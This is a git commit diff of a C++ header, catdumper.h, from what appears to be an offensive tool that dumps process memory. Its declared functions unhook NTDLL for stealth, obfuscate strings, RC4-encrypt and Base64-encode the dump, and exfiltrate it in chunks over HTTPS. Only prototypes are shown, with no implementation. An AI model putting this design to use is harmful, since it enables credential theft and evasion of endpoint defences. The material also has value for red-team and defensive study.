7f13c06310ca978ea19f0f0e0d622cb5bf133024
Meowmycks <45502375+Meowmycks@users.noreply.github.com>
2024-01-09 02:04:16 -0500

    Update catdumper.h
    Add NTDLL unhooking and additional stealth stuff.

--- catdumper.h
+++ catdumper.h
@@ -1,41 +1,49 @@
-#ifndef catdumper
-#define catdumper
+#ifndef CATDUMPER_H
+#define CATDUMPER_H
 
 #include <windows.h>
 #include <wincrypt.h>
 #include <winhttp.h>
 #include <dbghelp.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+#include <processsnapshot.h>
 #include <iostream>
 #include <string>
 #include <random>
 #include <vector>
 #include <chrono>
 #include <thread>
-#include <tlhelp32.h>
-#include <processsnapshot.h>
 
+extern const size_t dumpBufferSize;
 extern LPVOID dumpBuffer;
 extern DWORD bytesRead;
 
+// Callback prototype for in-memory processes
 BOOL CALLBACK minidumpCallback(
     PVOID callbackParam,
     const PMINIDUMP_CALLBACK_INPUT callbackInput,
     PMINIDUMP_CALLBACK_OUTPUT callbackOutput
 );
 
+// Function prototype for error-checking
+std::wstring GetLastErrorMessage();
+
+// Function prototypes for string processing
 std::wstring ASCIItoWString(const std::vector<int>& asciiValues);
 std::string ASCIItoString(const std::vector<int>& asciiValues);
 
+// Function prototypes for minidump processing
+void UnhookNtdll();
 constexpr unsigned int numRNG();
 std::string Keygen(int length);
-void RC4(std::vector<char>& data, const std::string& key);
 std::string EncryptDump(LPVOID dumpBuffer, DWORD dumpBufferSize, const std::string& key);
+void RC4(std::vector<char>& data, const std::string& key);
 std::string Base64Encode(const std::string& input);
 
+// Function prototypes for minidump exfiltration
 std::vector<std::string> SplitDataIntoChunks(const std::string& data, size_t chunkSize);
 bool SendHTTPSRequest(const std::string& hostname, const std::string& path, const std::string& data, bool isKey = false);
 void SendDataInChunks(const std::string& data, const std::string& hostname, const std::string& path);
-
-void SelfDelete();
 
 #endif
